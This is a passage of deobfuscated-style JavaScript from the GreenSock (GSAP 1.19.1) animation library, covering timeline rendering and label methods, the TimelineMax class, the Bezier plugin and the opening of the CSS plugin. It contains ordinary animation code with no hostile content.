                        n._reversed ? n.render((n._dirty ? n.totalDuration() : n._totalDuration) - (t - n._startTime) * n._timeScale, e, i) : n.render((t - n._startTime) * n._timeScale, e, i)
                    }
                    n = s
                }
                this._onUpdate && (e || (l.length && c(), this._callback("onUpdate"))),
                a && (this._gc || f !== this._startTime && m === this._timeScale || (0 === this._time || d >= this.totalDuration()) && (r && (l.length && c(), this._timeline.autoRemoveChildren && this._enabled(!1, !1), this._active = !1), !e && this.vars[a] && this._callback(a)))
            }
        },
        m._hasPausedChild = function() {
            for (var t = this._first; t;) {
                if (t._paused || t instanceof n && t._hasPausedChild()) return ! 0;
                t = t._next
            }
            return ! 1
        },
        m.getChildren = function(t, e, n, r) {
            r = r || -9999999999;
            for (var s = [], a = this._first, o = 0; a;) a._startTime < r || (a instanceof i ? e !== !1 && (s[o++] = a) : (n !== !1 && (s[o++] = a), t !== !1 && (s = s.concat(a.getChildren(!0, e, n)), o = s.length))),
            a = a._next;
            return s
        },
        m.getTweensOf = function(t, e) {
            var n, r, s = this._gc,
            a = [],
            o = 0;
            for (s && this._enabled(!0, !0), n = i.getTweensOf(t), r = n.length; --r > -1;)(n[r].timeline === this || e && this._contains(n[r])) && (a[o++] = n[r]);
            return s && this._enabled(!1, !0),
            a
        },
        m.recent = function() {
            return this._recent
        },
        m._contains = function(t) {
            for (var e = t.timeline; e;) {
                if (e === this) return ! 0;
                e = e.timeline
            }
            return ! 1
        },
        m.shiftChildren = function(t, e, i) {
            i = i || 0;
            for (var n, r = this._first,
            s = this._labels; r;) r._startTime >= i && (r._startTime += t),
            r = r._next;
            if (e) for (n in s) s[n] >= i && (s[n] += t);
            return this._uncache(!0)
        },
        m._kill = function(t, e) {
            if (!t && !e) return this._enabled(!1, !1);
            for (var i = e ? this.getTweensOf(e) : this.getChildren(!0, !0, !1), n = i.length, r = !1; --n > -1;) i[n]._kill(t, e) && (r = !0);
            return r
        },
        m.clear = function(t) {
            var e = this.getChildren(!1, !0, !0),
            i = e.length;
            for (this._time = this._totalTime = 0; --i > -1;) e[i]._enabled(!1, !1);
            return t !== !1 && (this._labels = {}),
            this._uncache(!0)
        },
        m.invalidate = function() {
            for (var e = this._first; e;) e.invalidate(),
            e = e._next;
            return t.prototype.invalidate.call(this)
        },
        m._enabled = function(t, i) {
            if (t === this._gc) for (var n = this._first; n;) n._enabled(t, !0),
            n = n._next;
            return e.prototype._enabled.call(this, t, i)
        },
        m.totalTime = function(e, i, n) {
            this._forcingPlayhead = !0;
            var r = t.prototype.totalTime.apply(this, arguments);
            return this._forcingPlayhead = !1,
            r
        },
        m.duration = function(t) {
            return arguments.length ? (0 !== this.duration() && 0 !== t && this.timeScale(this._duration / t), this) : (this._dirty && this.totalDuration(), this._duration)
        },
        m.totalDuration = function(t) {
            if (!arguments.length) {
                if (this._dirty) {
                    for (var e, i, n = 0,
                    r = this._last,
                    s = 999999999999; r;) e = r._prev,
                    r._dirty && r.totalDuration(),
                    r._startTime > s && this._sortChildren && !r._paused ? this.add(r, r._startTime - r._delay) : s = r._startTime,
                    r._startTime < 0 && !r._paused && (n -= r._startTime, this._timeline.smoothChildTiming && (this._startTime += r._startTime / this._timeScale), this.shiftChildren( - r._startTime, !1, -9999999999), s = 0),
                    i = r._startTime + r._totalDuration / r._timeScale,
                    i > n && (n = i),
                    r = e;
                    this._duration = this._totalDuration = n,
                    this._dirty = !1
                }
                return this._totalDuration
            }
            return t && this.totalDuration() ? this.timeScale(this._totalDuration / t) : this
        },
        m.paused = function(e) {
            if (!e) for (var i = this._first,
            n = this._time; i;) i._startTime === n && "isPause" === i.data && (i._rawPrevTime = 0),
            i = i._next;
            return t.prototype.paused.apply(this, arguments)
        },
        m.usesFrames = function() {
            for (var e = this._timeline; e._timeline;) e = e._timeline;
            return e === t._rootFramesTimeline
        },
        m.rawTime = function(t) {
            return t && (this._paused || this._repeat && this.time() > 0 && this.totalProgress() < 1) ? this._totalTime % (this._duration + this._repeatDelay) : this._paused ? this._totalTime: (this._timeline.rawTime(t) - this._startTime) * this._timeScale
        },
        n
    },
    !0),
    _gsScope._gsDefine("TimelineMax", ["TimelineLite", "TweenLite", "easing.Ease"],
    function(t, e, i) {
        var n = function(e) {
            t.call(this, e),
            this._repeat = this.vars.repeat || 0,
            this._repeatDelay = this.vars.repeatDelay || 0,
            this._cycle = 0,
            this._yoyo = this.vars.yoyo === !0,
            this._dirty = !0
        },
        r = e._internals,
        s = r.lazyTweens,
        a = r.lazyRender,
        o = _gsScope._gsDefine.globals,
        l = new i(null, null, 1, 0),
        c = n.prototype = new t;
        return c.constructor = n,
        c.kill()._gc = !1,
        n.version = "1.19.1",
        c.invalidate = function() {
            return this._yoyo = this.vars.yoyo === !0,
            this._repeat = this.vars.repeat || 0,
            this._repeatDelay = this.vars.repeatDelay || 0,
            this._uncache(!0),
            t.prototype.invalidate.call(this)
        },
        c.addCallback = function(t, i, n, r) {
            return this.add(e.delayedCall(0, t, n, r), i)
        },
        c.removeCallback = function(t, e) {
            if (t) if (null == e) this._kill(null, t);
            else for (var i = this.getTweensOf(t, !1), n = i.length, r = this._parseTimeOrLabel(e); --n > -1;) i[n]._startTime === r && i[n]._enabled(!1, !1);
            return this
        },
        c.removePause = function(e) {
            return this.removeCallback(t._internals.pauseCallback, e)
        },
        c.tweenTo = function(t, i) {
            i = i || {};
            var n, r, s, a = {
                ease: l,
                useFrames: this.usesFrames(),
                immediateRender: !1
            },
            c = i.repeat && o.TweenMax || e;
            for (r in i) a[r] = i[r];
            return a.time = this._parseTimeOrLabel(t),
            n = Math.abs(Number(a.time) - this._time) / this._timeScale || .001,
            s = new c(this, n, a),
            a.onStart = function() {
                s.target.paused(!0),
                s.vars.time !== s.target.time() && n === s.duration() && s.duration(Math.abs(s.vars.time - s.target.time()) / s.target._timeScale),
                i.onStart && i.onStart.apply(i.onStartScope || i.callbackScope || s, i.onStartParams || [])
            },
            s
        },
        c.tweenFromTo = function(t, e, i) {
            i = i || {},
            t = this._parseTimeOrLabel(t),
            i.startAt = {
                onComplete: this.seek,
                onCompleteParams: [t],
                callbackScope: this
            },
            i.immediateRender = i.immediateRender !== !1;
            var n = this.tweenTo(e, i);
            return n.duration(Math.abs(n.vars.time - t) / this._timeScale || .001)
        },
        c.render = function(t, e, i) {
            this._gc && this._enabled(!0, !1);
            var n, r, o, l, c, h, u, d, p = this._dirty ? this.totalDuration() : this._totalDuration,
            f = this._duration,
            m = this._time,
            g = this._totalTime,
            v = this._startTime,
            _ = this._timeScale,
            y = this._rawPrevTime,
            b = this._paused,
            w = this._cycle;
            if (t >= p - 1e-7 && t >= 0) this._locked || (this._totalTime = p, this._cycle = this._repeat),
            this._reversed || this._hasPausedChild() || (r = !0, l = "onComplete", c = !!this._timeline.autoRemoveChildren, 0 === this._duration && (t <= 0 && t >= -1e-7 || y < 0 || 1e-10 === y) && y !== t && this._first && (c = !0, y > 1e-10 && (l = "onReverseComplete"))),
            this._rawPrevTime = this._duration || !e || t || this._rawPrevTime === t ? t: 1e-10,
            this._yoyo && 0 != (1 & this._cycle) ? this._time = t = 0 : (this._time = f, t = f + 1e-4);
            else if (t < 1e-7) if (this._locked || (this._totalTime = this._cycle = 0), this._time = 0, (0 !== m || 0 === f && 1e-10 !== y && (y > 0 || t < 0 && y >= 0) && !this._locked) && (l = "onReverseComplete", r = this._reversed), t < 0) this._active = !1,
            this._timeline.autoRemoveChildren && this._reversed ? (c = r = !0, l = "onReverseComplete") : y >= 0 && this._first && (c = !0),
            this._rawPrevTime = t;
            else {
                if (this._rawPrevTime = f || !e || t || this._rawPrevTime === t ? t: 1e-10, 0 === t && r) for (n = this._first; n && 0 === n._startTime;) n._duration || (r = !1),
                n = n._next;
                t = 0,
                this._initted || (c = !0)
            } else if (0 === f && y < 0 && (c = !0), this._time = this._rawPrevTime = t, this._locked || (this._totalTime = t, 0 !== this._repeat && (h = f + this._repeatDelay, this._cycle = this._totalTime / h >> 0, 0 !== this._cycle && this._cycle === this._totalTime / h && g <= t && this._cycle--, this._time = this._totalTime - this._cycle * h, this._yoyo && 0 != (1 & this._cycle) && (this._time = f - this._time), this._time > f ? (this._time = f, t = f + 1e-4) : this._time < 0 ? this._time = t = 0 : t = this._time)), this._hasPause && !this._forcingPlayhead && !e && t < f) {
                if ((t = this._time) >= m || this._repeat && w !== this._cycle) for (n = this._first; n && n._startTime <= t && !u;) n._duration || "isPause" !== n.data || n.ratio || 0 === n._startTime && 0 === this._rawPrevTime || (u = n),
                n = n._next;
                else for (n = this._last; n && n._startTime >= t && !u;) n._duration || "isPause" === n.data && n._rawPrevTime > 0 && (u = n),
                n = n._prev;
                u && (this._time = t = u._startTime, this._totalTime = t + this._cycle * (this._totalDuration + this._repeatDelay))
            }
            if (this._cycle !== w && !this._locked) {
                var x = this._yoyo && 0 != (1 & w),
                T = x === (this._yoyo && 0 != (1 & this._cycle)),
                k = this._totalTime,
                S = this._cycle,
                C = this._rawPrevTime,
                P = this._time;
                if (this._totalTime = w * f, this._cycle < w ? x = !x: this._totalTime += f, this._time = m, this._rawPrevTime = 0 === f ? y - 1e-4: y, this._cycle = w, this._locked = !0, m = x ? 0 : f, this.render(m, e, 0 === f), e || this._gc || this.vars.onRepeat && (this._cycle = S, this._locked = !1, this._callback("onRepeat")), m !== this._time) return;
                if (T && (this._cycle = w, this._locked = !0, m = x ? f + 1e-4: -1e-4, this.render(m, !0, !1)), this._locked = !1, this._paused && !b) return;
                this._time = P,
                this._totalTime = k,
                this._cycle = S,
                this._rawPrevTime = C
            }
            if (! (this._time !== m && this._first || i || c || u)) return void(g !== this._totalTime && this._onUpdate && (e || this._callback("onUpdate")));
            if (this._initted || (this._initted = !0), this._active || !this._paused && this._totalTime !== g && t > 0 && (this._active = !0), 0 === g && this.vars.onStart && (0 === this._totalTime && this._totalDuration || e || this._callback("onStart")), (d = this._time) >= m) for (n = this._first; n && (o = n._next, d === this._time && (!this._paused || b));)(n._active || n._startTime <= this._time && !n._paused && !n._gc) && (u === n && this.pause(), n._reversed ? n.render((n._dirty ? n.totalDuration() : n._totalDuration) - (t - n._startTime) * n._timeScale, e, i) : n.render((t - n._startTime) * n._timeScale, e, i)),
            n = o;
            else for (n = this._last; n && (o = n._prev, d === this._time && (!this._paused || b));) {
                if (n._active || n._startTime <= m && !n._paused && !n._gc) {
                    if (u === n) {
                        for (u = n._prev; u && u.endTime() > this._time;) u.render(u._reversed ? u.totalDuration() - (t - u._startTime) * u._timeScale: (t - u._startTime) * u._timeScale, e, i),
                        u = u._prev;
                        u = null,
                        this.pause()
                    }
                    n._reversed ? n.render((n._dirty ? n.totalDuration() : n._totalDuration) - (t - n._startTime) * n._timeScale, e, i) : n.render((t - n._startTime) * n._timeScale, e, i)
                }
                n = o
            }
            this._onUpdate && (e || (s.length && a(), this._callback("onUpdate"))),
            l && (this._locked || this._gc || v !== this._startTime && _ === this._timeScale || (0 === this._time || p >= this.totalDuration()) && (r && (s.length && a(), this._timeline.autoRemoveChildren && this._enabled(!1, !1), this._active = !1), !e && this.vars[l] && this._callback(l)))
        },
        c.getActive = function(t, e, i) {
            null == t && (t = !0),
            null == e && (e = !0),
            null == i && (i = !1);
            var n, r, s = [],
            a = this.getChildren(t, e, i),
            o = 0,
            l = a.length;
            for (n = 0; n < l; n++) r = a[n],
            r.isActive() && (s[o++] = r);
            return s
        },
        c.getLabelAfter = function(t) {
            t || 0 !== t && (t = this._time);
            var e, i = this.getLabelsArray(),
            n = i.length;
            for (e = 0; e < n; e++) if (i[e].time > t) return i[e].name;
            return null
        },
        c.getLabelBefore = function(t) {
            null == t && (t = this._time);
            for (var e = this.getLabelsArray(), i = e.length; --i > -1;) if (e[i].time < t) return e[i].name;
            return null
        },
        c.getLabelsArray = function() {
            var t, e = [],
            i = 0;
            for (t in this._labels) e[i++] = {
                time: this._labels[t],
                name: t
            };
            return e.sort(function(t, e) {
                return t.time - e.time
            }),
            e
        },
        c.invalidate = function() {
            return this._locked = !1,
            t.prototype.invalidate.call(this)
        },
        c.progress = function(t, e) {
            return arguments.length ? this.totalTime(this.duration() * (this._yoyo && 0 != (1 & this._cycle) ? 1 - t: t) + this._cycle * (this._duration + this._repeatDelay), e) : this._time / this.duration()
        },
        c.totalProgress = function(t, e) {
            return arguments.length ? this.totalTime(this.totalDuration() * t, e) : this._totalTime / this.totalDuration()
        },
        c.totalDuration = function(e) {
            return arguments.length ? this._repeat !== -1 && e ? this.timeScale(this.totalDuration() / e) : this: (this._dirty && (t.prototype.totalDuration.call(this), this._totalDuration = this._repeat === -1 ? 999999999999 : this._duration * (this._repeat + 1) + this._repeatDelay * this._repeat), this._totalDuration)
        },
        c.time = function(t, e) {
            return arguments.length ? (this._dirty && this.totalDuration(), t > this._duration && (t = this._duration), this._yoyo && 0 != (1 & this._cycle) ? t = this._duration - t + this._cycle * (this._duration + this._repeatDelay) : 0 !== this._repeat && (t += this._cycle * (this._duration + this._repeatDelay)), this.totalTime(t, e)) : this._time
        },
        c.repeat = function(t) {
            return arguments.length ? (this._repeat = t, this._uncache(!0)) : this._repeat
        },
        c.repeatDelay = function(t) {
            return arguments.length ? (this._repeatDelay = t, this._uncache(!0)) : this._repeatDelay
        },
        c.yoyo = function(t) {
            return arguments.length ? (this._yoyo = t, this) : this._yoyo
        },
        c.currentLabel = function(t) {
            return arguments.length ? this.seek(t, !0) : this.getLabelBefore(this._time + 1e-8)
        },
        n
    },
    !0),
    function() {
        var t = 180 / Math.PI,
        e = [],
        i = [],
        n = [],
        r = {},
        s = _gsScope._gsDefine.globals,
        a = function(t, e, i, n) {
            i === n && (i = n - (n - e) / 1e6),
            t === e && (e = t + (i - t) / 1e6),
            this.a = t,
            this.b = e,
            this.c = i,
            this.d = n,
            this.da = n - t,
            this.ca = i - t,
            this.ba = e - t
        },
        o = function(t, e, i, n) {
            var r = {
                a: t
            },
            s = {},
            a = {},
            o = {
                c: n
            },
            l = (t + e) / 2,
            c = (e + i) / 2,
            h = (i + n) / 2,
            u = (l + c) / 2,
            d = (c + h) / 2,
            p = (d - u) / 8;
            return r.b = l + (t - l) / 4,
            s.b = u + p,
            r.c = s.a = (r.b + s.b) / 2,
            s.c = a.a = (u + d) / 2,
            a.b = d - p,
            o.b = h + (n - h) / 4,
            a.c = o.a = (a.b + o.b) / 2,
            [r, s, a, o]
        },
        l = function(t, r, s, a, l) {
            var c, h, u, d, p, f, m, g, v, _, y, b, w, x = t.length - 1,
            T = 0,
            k = t[0].a;
            for (c = 0; c < x; c++) p = t[T],
            h = p.a,
            u = p.d,
            d = t[T + 1].d,
            l ? (y = e[c], b = i[c], w = (b + y) * r * .25 / (a ? .5 : n[c] || .5), f = u - (u - h) * (a ? .5 * r: 0 !== y ? w / y: 0), m = u + (d - u) * (a ? .5 * r: 0 !== b ? w / b: 0), g = u - (f + ((m - f) * (3 * y / (y + b) + .5) / 4 || 0))) : (f = u - (u - h) * r * .5, m = u + (d - u) * r * .5, g = u - (f + m) / 2),
            f += g,
            m += g,
            p.c = v = f,
            p.b = 0 !== c ? k: k = p.a + .6 * (p.c - p.a),
            p.da = u - h,
            p.ca = v - h,
            p.ba = k - h,
            s ? (_ = o(h, k, v, u), t.splice(T, 1, _[0], _[1], _[2], _[3]), T += 4) : T++,
            k = m;
            p = t[T],
            p.b = k,
            p.c = k + .4 * (p.d - k),
            p.da = p.d - p.a,
            p.ca = p.c - p.a,
            p.ba = k - p.a,
            s && (_ = o(p.a, k, p.c, p.d), t.splice(T, 1, _[0], _[1], _[2], _[3]))
        },
        c = function(t, n, r, s) {
            var o, l, c, h, u, d, p = [];
            if (s) for (t = [s].concat(t), l = t.length; --l > -1;)"string" == typeof(d = t[l][n]) && "=" === d.charAt(1) && (t[l][n] = s[n] + Number(d.charAt(0) + d.substr(2)));
            if ((o = t.length - 2) < 0) return p[0] = new a(t[0][n], 0, 0, t[o < -1 ? 0 : 1][n]),
            p;
            for (l = 0; l < o; l++) c = t[l][n],
            h = t[l + 1][n],
            p[l] = new a(c, 0, 0, h),
            r && (u = t[l + 2][n], e[l] = (e[l] || 0) + (h - c) * (h - c), i[l] = (i[l] || 0) + (u - h) * (u - h));
            return p[l] = new a(t[l][n], 0, 0, t[l + 1][n]),
            p
        },
        h = function(t, s, a, o, h, u) {
            var d, p, f, m, g, v, _, y, b = {},
            w = [],
            x = u || t[0];
            h = "string" == typeof h ? "," + h + ",": ",x,y,z,left,top,right,bottom,marginTop,marginLeft,marginRight,marginBottom,paddingLeft,paddingTop,paddingRight,paddingBottom,backgroundPosition,backgroundPosition_y,",
            null == s && (s = 1);
            for (p in t[0]) w.push(p);
            if (t.length > 1) {
                for (y = t[t.length - 1], _ = !0, d = w.length; --d > -1;) if (p = w[d], Math.abs(x[p] - y[p]) > .05) {
                    _ = !1;
                    break
                }
                _ && (t = t.concat(), u && t.unshift(u), t.push(t[1]), u = t[t.length - 3])
            }
            for (e.length = i.length = n.length = 0, d = w.length; --d > -1;) p = w[d],
            r[p] = h.indexOf("," + p + ",") !== -1,
            b[p] = c(t, p, r[p], u);
            for (d = e.length; --d > -1;) e[d] = Math.sqrt(e[d]),
            i[d] = Math.sqrt(i[d]);
            if (!o) {
                for (d = w.length; --d > -1;) if (r[p]) for (f = b[w[d]], v = f.length - 1, m = 0; m < v; m++) g = f[m + 1].da / i[m] + f[m].da / e[m] || 0,
                n[m] = (n[m] || 0) + g * g;
                for (d = n.length; --d > -1;) n[d] = Math.sqrt(n[d])
            }
            for (d = w.length, m = a ? 4 : 1; --d > -1;) p = w[d],
            f = b[p],
            l(f, s, a, o, r[p]),
            _ && (f.splice(0, m), f.splice(f.length - m, m));
            return b
        },
        u = function(t, e, i) {
            e = e || "soft";
            var n, r, s, o, l, c, h, u, d, p, f, m = {},
            g = "cubic" === e ? 3 : 2,
            v = "soft" === e,
            _ = [];
            if (v && i && (t = [i].concat(t)), null == t || t.length < g + 1) throw "invalid Bezier data";
            for (d in t[0]) _.push(d);
            for (c = _.length; --c > -1;) {
                for (d = _[c], m[d] = l = [], p = 0, u = t.length, h = 0; h < u; h++) n = null == i ? t[h][d] : "string" == typeof(f = t[h][d]) && "=" === f.charAt(1) ? i[d] + Number(f.charAt(0) + f.substr(2)) : Number(f),
                v && h > 1 && h < u - 1 && (l[p++] = (n + l[p - 2]) / 2),
                l[p++] = n;
                for (u = p - g + 1, p = 0, h = 0; h < u; h += g) n = l[h],
                r = l[h + 1],
                s = l[h + 2],
                o = 2 === g ? 0 : l[h + 3],
                l[p++] = f = 3 === g ? new a(n, r, s, o) : new a(n, (2 * r + n) / 3, (2 * r + s) / 3, s);
                l.length = p
            }
            return m
        },
        d = function(t, e, i) {
            for (var n, r, s, a, o, l, c, h, u, d, p, f = 1 / i,
            m = t.length; --m > -1;) for (d = t[m], s = d.a, a = d.d - s, o = d.c - s, l = d.b - s, n = r = 0, h = 1; h <= i; h++) c = f * h,
            u = 1 - c,
            n = r - (r = (c * c * a + 3 * u * (c * o + u * l)) * c),
            p = m * i + h - 1,
            e[p] = (e[p] || 0) + n * n
        },
        p = function(t, e) {
            e = e >> 0 || 6;
            var i, n, r, s, a = [],
            o = [],
            l = 0,
            c = 0,
            h = e - 1,
            u = [],
            p = [];
            for (i in t) d(t[i], a, e);
            for (r = a.length, n = 0; n < r; n++) l += Math.sqrt(a[n]),
            s = n % e,
            p[s] = l,
            s === h && (c += l, s = n / e >> 0, u[s] = p, o[s] = c, l = 0, p = []);
            return {
                length: c,
                lengths: o,
                segments: u
            }
        },
        f = _gsScope._gsDefine.plugin({
            propName: "bezier",
            priority: -1,
            version: "1.3.7",
            API: 2,
            global: !0,
            init: function(t, e, i) {
                this._target = t,
                e instanceof Array && (e = {
                    values: e
                }),
                this._func = {},
                this._mod = {},
                this._props = [],
                this._timeRes = null == e.timeResolution ? 6 : parseInt(e.timeResolution, 10);
                var n, r, s, a, o, l = e.values || [],
                c = {},
                d = l[0],
                f = e.autoRotate || i.vars.orientToBezier;
                this._autoRotate = f ? f instanceof Array ? f: [["x", "y", "rotation", f === !0 ? 0 : Number(f) || 0]] : null;
                for (n in d) this._props.push(n);
                for (s = this._props.length; --s > -1;) n = this._props[s],
                this._overwriteProps.push(n),
                r = this._func[n] = "function" == typeof t[n],
                c[n] = r ? t[n.indexOf("set") || "function" != typeof t["get" + n.substr(3)] ? n: "get" + n.substr(3)]() : parseFloat(t[n]),
                o || c[n] !== l[0][n] && (o = c);
                if (this._beziers = "cubic" !== e.type && "quadratic" !== e.type && "soft" !== e.type ? h(l, isNaN(e.curviness) ? 1 : e.curviness, !1, "thruBasic" === e.type, e.correlate, o) : u(l, e.type, c), this._segCount = this._beziers[n].length, this._timeRes) {
                    var m = p(this._beziers, this._timeRes);
                    this._length = m.length,
                    this._lengths = m.lengths,
                    this._segments = m.segments,
                    this._l1 = this._li = this._s1 = this._si = 0,
                    this._l2 = this._lengths[0],
                    this._curSeg = this._segments[0],
                    this._s2 = this._curSeg[0],
                    this._prec = 1 / this._curSeg.length
                }
                if (f = this._autoRotate) for (this._initialRotations = [], f[0] instanceof Array || (this._autoRotate = f = [f]), s = f.length; --s > -1;) {
                    for (a = 0; a < 3; a++) n = f[s][a],
                    this._func[n] = "function" == typeof t[n] && t[n.indexOf("set") || "function" != typeof t["get" + n.substr(3)] ? n: "get" + n.substr(3)];
                    n = f[s][2],
                    this._initialRotations[s] = (this._func[n] ? this._func[n].call(this._target) : this._target[n]) || 0,
                    this._overwriteProps.push(n)
                }
                return this._startRatio = i.vars.runBackwards ? 1 : 0,
                !0
            },
            set: function(e) {
                var i, n, r, s, a, o, l, c, h, u, d = this._segCount,
                p = this._func,
                f = this._target,
                m = e !== this._startRatio;
                if (this._timeRes) {
                    if (h = this._lengths, u = this._curSeg, e *= this._length, r = this._li, e > this._l2 && r < d - 1) {
                        for (c = d - 1; r < c && (this._l2 = h[++r]) <= e;);
                        this._l1 = h[r - 1],
                        this._li = r,
                        this._curSeg = u = this._segments[r],
                        this._s2 = u[this._s1 = this._si = 0]
                    } else if (e < this._l1 && r > 0) {
                        for (; r > 0 && (this._l1 = h[--r]) >= e;);
                        0 === r && e < this._l1 ? this._l1 = 0 : r++,
                        this._l2 = h[r],
                        this._li = r,
                        this._curSeg = u = this._segments[r],
                        this._s1 = u[(this._si = u.length - 1) - 1] || 0,
                        this._s2 = u[this._si]
                    }
                    if (i = r, e -= this._l1, r = this._si, e > this._s2 && r < u.length - 1) {
                        for (c = u.length - 1; r < c && (this._s2 = u[++r]) <= e;);
                        this._s1 = u[r - 1],
                        this._si = r
                    } else if (e < this._s1 && r > 0) {
                        for (; r > 0 && (this._s1 = u[--r]) >= e;);
                        0 === r && e < this._s1 ? this._s1 = 0 : r++,
                        this._s2 = u[r],
                        this._si = r
                    }
                    o = (r + (e - this._s1) / (this._s2 - this._s1)) * this._prec || 0
                } else i = e < 0 ? 0 : e >= 1 ? d - 1 : d * e >> 0,
                o = (e - i * (1 / d)) * d;
                for (n = 1 - o, r = this._props.length; --r > -1;) s = this._props[r],
                a = this._beziers[s][i],
                l = (o * o * a.da + 3 * n * (o * a.ca + n * a.ba)) * o + a.a,
                this._mod[s] && (l = this._mod[s](l, f)),
                p[s] ? f[s](l) : f[s] = l;
                if (this._autoRotate) {
                    var g, v, _, y, b, w, x, T = this._autoRotate;
                    for (r = T.length; --r > -1;) s = T[r][2],
                    w = T[r][3] || 0,
                    x = T[r][4] === !0 ? 1 : t,
                    a = this._beziers[T[r][0]],
                    g = this._beziers[T[r][1]],
                    a && g && (a = a[i], g = g[i], v = a.a + (a.b - a.a) * o, y = a.b + (a.c - a.b) * o, v += (y - v) * o, y += (a.c + (a.d - a.c) * o - y) * o, _ = g.a + (g.b - g.a) * o, b = g.b + (g.c - g.b) * o, _ += (b - _) * o, b += (g.c + (g.d - g.c) * o - b) * o, l = m ? Math.atan2(b - _, y - v) * x + w: this._initialRotations[r], this._mod[s] && (l = this._mod[s](l, f)), p[s] ? f[s](l) : f[s] = l)
                }
            }
        }),
        m = f.prototype;
        f.bezierThrough = h,
        f.cubicToQuadratic = o,
        f._autoCSS = !0,
        f.quadraticToCubic = function(t, e, i) {
            return new a(t, (2 * e + t) / 3, (2 * e + i) / 3, i)
        },
        f._cssRegister = function() {
            var t = s.CSSPlugin;
            if (t) {
                var e = t._internals,
                i = e._parseToProxy,
                n = e._setPluginRatio,
                r = e.CSSPropTween;
                e._registerComplexSpecialProp("bezier", {
                    parser: function(t, e, s, a, o, l) {
                        e instanceof Array && (e = {
                            values: e
                        }),
                        l = new f;
                        var c, h, u, d = e.values,
                        p = d.length - 1,
                        m = [],
                        g = {};
                        if (p < 0) return o;
                        for (c = 0; c <= p; c++) u = i(t, d[c], a, o, l, p !== c),
                        m[c] = u.end;
                        for (h in e) g[h] = e[h];
                        return g.values = m,
                        o = new r(t, "bezier", 0, 0, u.pt, 2),
                        o.data = u,
                        o.plugin = l,
                        o.setRatio = n,
                        0 === g.autoRotate && (g.autoRotate = !0),
                        !g.autoRotate || g.autoRotate instanceof Array || (c = g.autoRotate === !0 ? 0 : Number(g.autoRotate), g.autoRotate = null != u.end.left ? [["left", "top", "rotation", c, !1]] : null != u.end.x && [["x", "y", "rotation", c, !1]]),
                        g.autoRotate && (a._transform || a._enableTransforms(!1), u.autoRotate = a._target._gsTransform, u.proxy.rotation = u.autoRotate.rotation || 0, a._overwriteProps.push("rotation")),
                        l._onInitTween(u.proxy, g, a._tween),
                        o
                    }
                })
            }
        },
        m._mod = function(t) {
            for (var e, i = this._overwriteProps,
            n = i.length; --n > -1;)(e = t[i[n]]) && "function" == typeof e && (this._mod[i[n]] = e)
        },
        m._kill = function(t) {
            var e, i, n = this._props;
            for (e in this._beziers) if (e in t) for (delete this._beziers[e], delete this._func[e], i = n.length; --i > -1;) n[i] === e && n.splice(i, 1);
            if (n = this._autoRotate) for (i = n.length; --i > -1;) t[n[i][2]] && n.splice(i, 1);
            return this._super._kill.call(this, t)
        }
    } (),
    _gsScope._gsDefine("plugins.CSSPlugin", ["plugins.TweenPlugin", "TweenLite"],
    function(t, e) {
        var i, n, r, s, a = function() {
            t.call(this, "css"),
            this._overwriteProps.length = 0,
            this.setRatio = a.prototype.setRatio
        },
        o = _gsScope._gsDefine.globals,
        l = {},
        c = a.prototype = new t("css");
        c.constructor = a,
        a.version = "1.19.1",
        a.API = 2,
        a.defaultTransformPerspective = 0,
        a.defaultSkewType = "compensated",
        a.defaultSmoothOrigin = !0,
        c = "px",
        a.suffixMap = {
            top: c,
            right: c,
            bottom: c,
            left: c,
            width: c,
            height: c,
            fontSize: c,
            padding: c,
            margin: c,
            perspective: c,
            lineHeight: ""
        };
        var h, u, d, p, f, m, g, v, _ = /(?:\-|\.|\b)(\d|\.|e\-)+/g,
        y = /(?:\d|\-\d|\.\d|\-\.\d|\+=\d|\-=\d|\+=.\d|\-=\.\d)+/g,
        b = /(?:\+=|\-=|\-|\b)[\d\-\.]+[a-zA-Z0-9]*(?:%|\b)/gi,
        w = /(?![+-]?\d*\.?\d+|[+-]|e[+-]\d+)[^0-9]/g,
        x = /(?:\d|\-|\+|=|#|\.)*/g,
        T = /opacity *= *([^)]*)/i,
        k = /opacity:([^;]*)/i,
        S = /^(rgb|hsl)/,
        C = function(t, e) {
            return e.toUpperCase()
        },
        P = /(?:Left|Right|Width)/i,
        R = /,(?=[^\)]*(?:\(|$))/gi,
        A = /[\s,\(]/i,
        O = Math.PI / 180,
        M = 180 / Math.PI,
        E = {},
        z = {
            style: {}
        },
        F = _gsScope.document || {
            createElement: function() {
                return z
            }
        },
        I = function(t, e) {
            return F.createElementNS ? F.createElementNS(e || "http://www.w3.org/1999/xhtml", t) : F.createElement(t)
        },
        D = I("div"),
        L = I("img"),
        q = a._internals = {
            _specialProps: l
        },
        N = (_gsScope.navigator || {}).userAgent || "",
        $ = function() {
            var t = N.indexOf("Android"),
            e = I("a");
            return d = N.indexOf("Safari") !== -1 && N.indexOf("Chrome") === -1 && (t === -1 || parseFloat(N.substr(t + 8, 2)) > 3),
            f = d && parseFloat(N.substr(N.indexOf("Version/") + 8, 2)) < 6,
            p = N.indexOf("Firefox") !== -1,
            (/MSIE ([0-9]{1,}[\.0-9]{0,})/.exec(N) || /Trident\/.*rv:([0-9]{1,}[\.0-9]{0,})/.exec(N)) && (m = parseFloat(RegExp.$1)),
            !!e && (e.style.cssText = "top:1px;opacity:.55;", /^0.55/.test(e.style.opacity))
        } (),
        B = function(t) {
            return T.test("string" == typeof t ? t: (t.currentStyle ? t.currentStyle.filter: t.style.filter) || "") ? parseFloat(RegExp.$1) / 100 : 1
        },
        j = function(t) {
            _gsScope.console && console.log(t)
        },
        W = "",
        X = "",
        H = function(t, e) {
            e = e || D;
            var i, n, r = e.style;
            if (void 0 !== r[t]) return t;
            for (t = t.charAt(0).toUpperCase() + t.substr(1), i = ["O", "Moz", "ms", "Ms", "Webkit"], n = 5; --n > -1 && void 0 === r[i[n] + t];);
            return n >= 0 ? (X = 3 === n ? "ms": i[n], W = "-" + X.toLowerCase() + "-", X + t) : null
        },
        Y = F.defaultView ? F.defaultView.getComputedStyle: function() {},
        U = a.getStyle = function(t, e, i, n, r) {
            var s;
            return $ || "opacity" !== e ? (!n && t.style[e] ? s = t.style[e] : (i = i || Y(t)) ? s = i[e] || i.getPropertyValue(e) || i.getPropertyValue(e.replace(/([A-Z])/g, "-$1").toLowerCase()) : t.currentStyle && (s = t.currentStyle[e]), null == r || s && "none" !== s && "auto" !== s && "auto auto" !== s ? s: r) : B(t)
        },
        V = q.convertToPixels = function(t, i, n, r, s) {
            if ("px" === r || !r) return n;
            if ("auto" === r || !n) return 0;
            var o, l, c, h = P.test(i),
            u = t,
            d = D.style,
            p = n < 0,
